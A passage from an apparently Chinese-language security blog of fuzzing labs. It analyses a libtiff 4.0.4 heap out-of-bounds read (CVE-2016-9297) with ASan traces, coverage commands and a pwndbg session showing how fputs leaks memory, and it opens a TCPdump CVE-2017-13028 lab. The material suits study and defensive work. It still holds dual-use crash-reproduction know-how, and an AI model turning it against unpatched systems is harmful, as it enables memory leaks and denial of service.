class="number">19</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x3564d5</span> in _TIFFVSetField /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dir.c:<span class="number">539</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x34c2d6</span> in TIFFVSetField /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dir.c:<span class="number">820</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x34c2d6</span> in TIFFSetField /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dir.c:<span class="number">764</span>:<span class="number">11</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x38464e</span> in TIFFFetchNormalTag /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dirread.c:<span class="number">5164</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x377976</span> in TIFFReadDirectory /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_dirread.c:<span class="number">3810</span>:<span class="number">12</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x433bc9</span> in TIFFClientOpen /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_open.c:<span class="number">466</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x33ef47</span> in TIFFFdOpen /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_unix.c:<span class="number">178</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">10</span> <span class="number">0x33ef47</span> in TIFFOpen /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_unix.c:<span class="number">217</span>:<span class="number">8</span></span><br><span class="line">    #<span class="number">11</span> <span class="number">0x33ef47</span> in main /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">140</span>:<span class="number">9</span></span><br><span class="line">    #<span class="number">12</span> <span class="number">0x7f68b28f1082</span> in __libc_start_main /build/glibc-SzIz7B/glibc<span class="number">-2.31</span>/csu/../csu/libc-start.c:<span class="number">308</span>:<span class="number">16</span></span><br><span class="line"></span><br><span class="line">SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x2aadf1</span>) in <span class="built_in">fputs</span></span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x0c0e7fff7fc0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c0e7fff7fd0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c0e7fff7fe0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c0e7fff7ff0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x0c0e7fff8000</span>: fa fa fa fa fd fd fd fd fd fd fd fd fd fa fa fa</span><br><span class="line">=&gt;<span class="number">0x0c0e7fff8010</span>: fa fa <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>[<span class="number">01</span>]fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0e7fff8020</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0e7fff8030</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0e7fff8040</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0e7fff8050</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">  <span class="number">0x0c0e7fff8060</span>: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa</span><br><span class="line">Shadow byte legend (one shadow byte represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">3582061</span>==ABORTING</span><br></pre></td></tr></table></figure>
<ul>
<li>这种 crash 的原因就是堆溢出</li>
<li>目前只发现这两种类型的 crash</li>
</ul>
<p>经过对比发现：<strong>[CVE-2016-9297]</strong> 的 PoC 为 <code>id:000002</code>（通过精心编制的 TIFF_SETGET_C16ASCII 或 TIFF_SETGET_C32_ASCII 标记值来造成越界读取） </p>
<h2 id="PoC-Code-coverage"><a href="#PoC-Code-coverage" class="headerlink" title="PoC Code coverage"></a>PoC Code coverage</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/tiff-4.0.4/</span><br><span class="line">make clean</span><br><span class="line">  </span><br><span class="line">CFLAGS=&quot;--coverage&quot; LDFLAGS=&quot;--coverage&quot; ./configure --prefix=&quot;$HOME/fuzzing_tiff/coverage/&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
<p>然后我们依次输入以下内容来收集代码覆盖率数据：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME/tiff-4.0.4/</span><br><span class="line">lcov --zerocounters --directory ./ # 重置以前的计数器</span><br><span class="line">lcov --capture --initial --directory ./ --output-file app.info # 返回“基线”覆盖率数据文件,其中包含每条检测线的零覆盖率</span><br><span class="line"><span class="meta">$</span><span class="bash">HOME/fuzzing_tiff/coverage/bin/tiffinfo -D -j -c -r -s -w <span class="variable">$HOME</span>/fuzzing_tiff/out/default/crashes/<span class="built_in">test</span> <span class="comment"># 运行您要分析的应用程序,您可以使用不同的输入多次运行它</span></span></span><br><span class="line">lcov --no-checksum --directory ./ --capture --output-file app2.info # 将当前覆盖状态保存到app2.info文件中</span><br></pre></td></tr></table></figure>
<p>最后，我们必须生成 HTML 输出：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genhtml --highlight --legend -output-directory ./html-coverage/ ./app2.info</span><br></pre></td></tr></table></figure>
<ul>
<li>如果一切顺利，代码覆盖率报告将在 html-coverage 文件夹中创建，只需打开 <code>./html-coverage/index.html</code> 文件，您应该会看到如下内容：</li>
</ul>
<img src="/2022/08/17/Fuzz%20Lab4-tiff-4.0.4/1660629761847.png" class width="1660629761847"> 
<h2 id="Reproduce-the-crash"><a href="#Reproduce-the-crash" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><p>先使用没有 ASan 的 <code>tiffinfo</code> 来运行 crash 文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./tiffinfo test</span><br><span class="line">TIFFReadDirectoryCheckOrder: Warning, Invalid TIFF directory; tags are <span class="keyword">not</span> sorted in ascending order.</span><br><span class="line">TIFFReadDirectory: Warning, Unknown field with tag <span class="number">7217</span> (<span class="number">0x1c31</span>) encountered.</span><br><span class="line">TIFF Directory at offset <span class="number">0xbd4</span> (<span class="number">3028</span>)</span><br><span class="line">  Image Width: <span class="number">157</span> Image Length: <span class="number">151</span></span><br><span class="line">  Bits/Sample: <span class="number">1</span></span><br><span class="line">  Sample Format: <span class="keyword">unsigned</span> integer</span><br><span class="line">  Compression Scheme: None</span><br><span class="line">  Photometric Interpretation: <span class="function">palette <span class="title">color</span> <span class="params">(RGB from colormap)</span></span></span><br><span class="line"><span class="function">  Samples/Pixel: 1</span></span><br><span class="line"><span class="function">  Rows/Strip: 409</span></span><br><span class="line"><span class="function">  Planar Configuration: single image plane</span></span><br><span class="line"><span class="function">  Page Number: 0-1</span></span><br><span class="line"><span class="function">  Color Map: <span class="params">(present)</span></span></span><br><span class="line"><span class="function">  DocumentName: palette-1c-1b.tiff</span></span><br><span class="line"><span class="function">  Tag 7217: GraphicsMagick 1.2 unreleased Q16 http:<span class="comment">//ww��������������������w.#)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>发现程序的输出异常，我们先利用 ASan 进行调试，ASan 提供的报错信息如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">==<span class="number">3333</span>==ERROR: AddressSanitizer: heap-buffer-overflow on address <span class="number">0x6070000000d1</span> at pc <span class="number">0x0000002aadf2</span> bp <span class="number">0x7fffffffda30</span> sp <span class="number">0x7fffffffd1f0</span></span><br><span class="line">READ of size <span class="number">66</span> at <span class="number">0x6070000000d1</span> thread T0</span><br><span class="line">[Attaching after Thread <span class="number">0x7ffff7c01800</span> (LWP <span class="number">3333</span>) fork to child process <span class="number">3337</span>]</span><br><span class="line">[New inferior <span class="number">2</span> (process <span class="number">3337</span>)]</span><br><span class="line">[Detaching after fork from parent process <span class="number">3333</span>]</span><br><span class="line">[Inferior <span class="number">1</span> (process <span class="number">3333</span>) detached]</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">process <span class="number">3337</span> is executing <span class="keyword">new</span> program: /usr/lib/llvm<span class="number">-11</span>/bin/llvm-symbolizer</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x2aadf1</span> in <span class="built_in">fputs</span> (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x2aadf1</span>)</span><br><span class="line">    #<span class="number">1</span> <span class="number">0x47068f</span> in _TIFFPrintField /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c:<span class="number">127</span>:<span class="number">4</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x47068f</span> in TIFFPrintDirectory /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/libtiff/tif_print.c:<span class="number">641</span>:<span class="number">5</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x33fbad</span> in tiffinfo /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">449</span>:<span class="number">2</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x33f1d4</span> in main /home/yhellow/tiff<span class="number">-4.0</span><span class="number">.4</span>/tools/tiffinfo.c:<span class="number">152</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x7ffff7c28082</span> in __libc_start_main /build/glibc-SzIz7B/glibc<span class="number">-2.31</span>/csu/../csu/libc-start.c:<span class="number">308</span>:<span class="number">16</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x29165d</span> in _start (/home/yhellow/fuzzing_tiff/install/bin/tiffinfo+<span class="number">0x29165d</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>根据 ASan 提供的信息，在 <code>0x2aadf2</code> 打上断点，对比溢出点执行前后 heap 的变化：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*RAX  <span class="number">0x2aadf2</span> (<span class="built_in">fputs</span>+<span class="number">386</span>) ◂— lea    rdx, [rbp - <span class="number">0x840</span>]</span><br><span class="line">*RBX  <span class="number">0x607000000090</span> ◂— <span class="number">0x7363696870617247</span> (<span class="string">&#x27;Graphics&#x27;</span>)</span><br><span class="line">*RCX  <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0x14</span></span><br><span class="line">*RDI  <span class="number">0x232900</span> (__asan::kInterceptorViaLibrary) ◂— <span class="string">&#x27;interceptor_via_lib&#x27;</span></span><br><span class="line">*RSI  <span class="number">0x232900</span> (__asan::kInterceptorViaLibrary) ◂— <span class="string">&#x27;interceptor_via_lib&#x27;</span></span><br><span class="line">*RBP  <span class="number">0x7fffffffda30</span> —▸ <span class="number">0x7fffffffdbd0</span> —▸ <span class="number">0x7fffffffdc90</span> —▸ <span class="number">0x7fffffffdde0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffd1f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RIP  <span class="number">0x2aadf2</span> (<span class="built_in">fputs</span>+<span class="number">386</span>) ◂— lea    rdx, [rbp - <span class="number">0x840</span>]</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0x2aadf2</span> &lt;<span class="built_in">fputs</span>+<span class="number">386</span>&gt;    lea    rdx, [rbp - <span class="number">0x840</span>]</span><br><span class="line">   <span class="number">0x2aadf9</span> &lt;<span class="built_in">fputs</span>+<span class="number">393</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x2aadfc</span> &lt;<span class="built_in">fputs</span>+<span class="number">396</span>&gt;    mov    rsi, r13</span><br><span class="line">   <span class="number">0x2aadff</span> &lt;<span class="built_in">fputs</span>+<span class="number">399</span>&gt;    mov    rcx, r12</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> RAX  <span class="number">0x2aadf2</span> (<span class="built_in">fputs</span>+<span class="number">386</span>) ◂— lea    rdx, [rbp - <span class="number">0x840</span>]</span><br><span class="line"> RBX  <span class="number">0x607000000090</span> ◂— <span class="number">0x7363696870617247</span> (<span class="string">&#x27;Graphics&#x27;</span>)</span><br><span class="line"> RCX  <span class="number">0x0</span></span><br><span class="line">*RDX  <span class="number">0x7fffffffd1f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RDI  <span class="number">0x232900</span> (__asan::kInterceptorViaLibrary) ◂— <span class="string">&#x27;interceptor_via_lib&#x27;</span></span><br><span class="line"> RSI  <span class="number">0x232900</span> (__asan::kInterceptorViaLibrary) ◂— <span class="string">&#x27;interceptor_via_lib&#x27;</span></span><br><span class="line"> RBP  <span class="number">0x7fffffffda30</span> —▸ <span class="number">0x7fffffffdbd0</span> —▸ <span class="number">0x7fffffffdc90</span> —▸ <span class="number">0x7fffffffdde0</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffd1f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">*RIP  <span class="number">0x2aadf9</span> (<span class="built_in">fputs</span>+<span class="number">393</span>) ◂— mov    rdi, rax</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x2aadf2</span> &lt;<span class="built_in">fputs</span>+<span class="number">386</span>&gt;    lea    rdx, [rbp - <span class="number">0x840</span>]</span><br><span class="line"> ► <span class="number">0x2aadf9</span> &lt;<span class="built_in">fputs</span>+<span class="number">393</span>&gt;    mov    rdi, rax</span><br><span class="line">   <span class="number">0x2aadfc</span> &lt;<span class="built_in">fputs</span>+<span class="number">396</span>&gt;    mov    rsi, r13</span><br><span class="line">   <span class="number">0x2aadff</span> &lt;<span class="built_in">fputs</span>+<span class="number">399</span>&gt;    mov    rcx, r12</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fffffffda30</span><span class="number">-0x840</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdx rsp <span class="number">0x7fffffffd1f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓            <span class="number">5</span> skipped</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7fffffffd220</span> ◂— <span class="number">0x1b</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fffffffd228</span> ◂— <span class="number">0x400</span></span><br></pre></td></tr></table></figure>
<ul>
<li>其实这里还不容易看出内存泄露</li>
<li>所以我们用 GDB 在没有 ASan 的 <code>tiffinfo-&gt;tif_print.c:127</code> 处打断点，进行调试：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x289711</span> &lt;TIFFPrintDirectory+<span class="number">11761</span>&gt;    call   <span class="built_in">fputs</span>@plt                      &lt;<span class="built_in">fputs</span>@plt&gt;</span><br><span class="line">       s: <span class="number">0x49edc0</span> ◂— <span class="number">0x7363696870617247</span> (<span class="string">&#x27;Graphics&#x27;</span>)</span><br><span class="line">       stream: <span class="number">0x7ffff7e416a0</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2a84</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x49edc0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x49edc0</span> ◂— <span class="number">0x7363696870617247</span> (<span class="string">&#x27;Graphics&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x49edc8</span> ◂— <span class="number">0x31206b636967614d</span> (<span class="string">&#x27;Magick 1&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x49edd0</span> ◂— <span class="number">0x6c65726e7520322e</span> (<span class="string">&#x27;.2 unrel&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x49edd8</span> ◂— <span class="number">0x3151206465736165</span> (<span class="string">&#x27;eased Q1&#x27;</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x49ede0</span> ◂— <span class="number">0x2f3a707474682036</span> (<span class="string">&#x27;6 http:/&#x27;</span>)</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x49ede8</span> ◂— <span class="number">0xcccccccccc77772f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x49edf0</span> ◂— <span class="number">0xcccccccccccccccc</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x49edf8</span> ◂— <span class="number">0x77cccccccccccccc</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x49ee00</span> —▸ <span class="number">0x29232e</span> (tiffFields+<span class="number">2030</span>) —▸ <span class="number">0x330000</span> (__afl_area_initial+<span class="number">609936</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x49ee08</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x49ee10</span> ◂— <span class="number">0x734d6963</span> <span class="comment">/* &#x27;ciMs&#x27; */</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; x/<span class="number">64</span>xb <span class="number">0x49edc0</span></span><br><span class="line"><span class="number">0x49edc0</span>:	<span class="number">0x47</span>	<span class="number">0x72</span>	<span class="number">0x61</span>	<span class="number">0x70</span>	<span class="number">0x68</span>	<span class="number">0x69</span>	<span class="number">0x63</span>	<span class="number">0x73</span></span><br><span class="line"><span class="number">0x49edc8</span>:	<span class="number">0x4d</span>	<span class="number">0x61</span>	<span class="number">0x67</span>	<span class="number">0x69</span>	<span class="number">0x63</span>	<span class="number">0x6b</span>	<span class="number">0x20</span>	<span class="number">0x31</span></span><br><span class="line"><span class="number">0x49edd0</span>:	<span class="number">0x2e</span>	<span class="number">0x32</span>	<span class="number">0x20</span>	<span class="number">0x75</span>	<span class="number">0x6e</span>	<span class="number">0x72</span>	<span class="number">0x65</span>	<span class="number">0x6c</span></span><br><span class="line"><span class="number">0x49edd8</span>:	<span class="number">0x65</span>	<span class="number">0x61</span>	<span class="number">0x73</span>	<span class="number">0x65</span>	<span class="number">0x64</span>	<span class="number">0x20</span>	<span class="number">0x51</span>	<span class="number">0x31</span></span><br><span class="line"><span class="number">0x49ede0</span>:	<span class="number">0x36</span>	<span class="number">0x20</span>	<span class="number">0x68</span>	<span class="number">0x74</span>	<span class="number">0x74</span>	<span class="number">0x70</span>	<span class="number">0x3a</span>	<span class="number">0x2f</span></span><br><span class="line"><span class="number">0x49ede8</span>:	<span class="number">0x2f</span>	<span class="number">0x77</span>	<span class="number">0x77</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span></span><br><span class="line"><span class="number">0x49edf0</span>:	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span></span><br><span class="line"><span class="number">0x49edf8</span>:	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0xcc</span>	<span class="number">0x77</span></span><br><span class="line"><span class="number">0x49ee00</span>:	[<span class="number">0x2e</span>]	[<span class="number">0x23</span>]	[<span class="number">0x29</span>]	<span class="number">0x00</span>	<span class="number">0x00</span>	<span class="number">0x00</span>	<span class="number">0x00</span>	<span class="number">0x00</span></span><br></pre></td></tr></table></figure>
<ul>
<li>目标 <code>fputs</code> 执行结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">  Tag <span class="number">7217</span>: GraphicsMagick <span class="number">1.2</span> unreleased Q16 http:<span class="comment">//ww��������������������w.#)</span></span><br><span class="line">  <span class="number">1</span> Strips:</span><br><span class="line">      <span class="number">0</span>: [       <span class="number">8</span>,     <span class="number">3020</span>]</span><br><span class="line">[Inferior <span class="number">1</span> (process <span class="number">4622</span>) exited normally]</span><br></pre></td></tr></table></figure>
<ul>
<li>注意 <code>0x49ee00</code> 处：<ul>
<li><code>[0x2e]-&gt;[.]</code></li>
<li><code>[0x23]-&gt;[#]</code></li>
<li><code>[0x29]-&gt;[)]</code></li>
</ul>
</li>
<li>这是 <code>0x29232e (tiffFields+2030)</code> 的后3字节，而 <code>fputs</code> 把它打印出来了（内存泄露）</li>
</ul>
<p>因为 <code>fputs</code> 遇到 <code>\x00</code> 才会停止，这就导致了内存泄露</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/16/Fuzz%20Lab3-TCPdump/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/16/Fuzz%20Lab3-TCPdump/" class="post-title-link" itemprop="url">Fuzz Lab3-TCPdump</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-16 22:38:36" itemprop="dateCreated datePublished" datetime="2022-08-16T22:38:36+08:00">2022-08-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:09:22" itemprop="dateModified" datetime="2022-10-10T00:09:22+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Fuzz-Lab3：TCPdump"><a href="#Fuzz-Lab3：TCPdump" class="headerlink" title="Fuzz-Lab3：TCPdump"></a>Fuzz-Lab3：TCPdump</h2><p>在本练习中，我们将 fuzz <strong>TCPdump</strong> 数据包分析器（截取网络分组，并输出分组内容的工具），目标是在 TCPdump 4.9.2 中找到 [<strong>CVE-2017-13028</strong>] 的 crash/PoC</p>
<ul>
<li><strong>CVE-2017-13028</strong> 是一个越界读取漏洞，可以通过 BOOTP 数据包（引导协议）触发<ul>
<li>越界读取是当程序读取超出预期缓冲区末尾或开头之前的数据时发生的漏洞</li>
<li>结果，它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息</li>
</ul>
</li>
</ul>
